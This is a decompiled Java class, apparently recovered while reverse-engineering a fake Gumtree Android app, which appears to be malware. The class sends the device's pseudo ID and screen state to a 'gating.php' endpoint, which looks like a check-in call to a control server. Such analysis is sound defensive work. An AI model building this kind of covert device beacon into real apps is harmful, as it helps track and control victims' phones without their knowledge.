package com.gumsis.srs.api.requests;

import android.content.Context;
import com.gumsis.Realtalk;
import com.gumsis.api.request.HttpRequest;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.checktls.ScrTls;
import com.gumsis.srs.api.responses.HitGateResponse;
import org.json.JSONObject;

public class HitGateRequest
  extends HttpRequest
{
  public static final String PATH = "gating.php";
  private Context mContext;
  private HttpResponseHandler<HitGateResponse> mResponseHandlerHandler;
  
  public HitGateRequest(Context paramContext, HttpResponseHandler<HitGateResponse> paramHttpResponseHandler)
  {
    super(paramContext, "gating.php", 10);
    this.mContext = paramContext;
    this.mResponseHandlerHandler = paramHttpResponseHandler;
  }
  
  protected String getHttpParams(Context paramContext)
    throws Exception
  {
    return null;
  }
  
  public String getUrl()
  {
    String str2 = Realtalk.getPsuedoID(this.mContext);
    String str1 = str2;
    if (str2 == null) {
      str1 = "";
    }
    return getBaseUrl() + "?" + "ID=" + str1 + "&" + "screen=" + ScrTls.getScreenState(this.mContext);
  }
  
  protected void onRequestFailure(int paramInt, String paramString)
  {
    HitGateResponse localHitGateResponse = new HitGateResponse();
    localHitGateResponse.parseFailureResponse(paramInt, paramString);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localHitGateResponse);
    }
  }
  
  protected void onRequestSuccess(JSONObject paramJSONObject)
  {
    HitGateResponse localHitGateResponse = new HitGateResponse();
    localHitGateResponse.parseSuccessResponse(paramJSONObject);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localHitGateResponse);
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/srs/api/requests/HitGateRequest.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */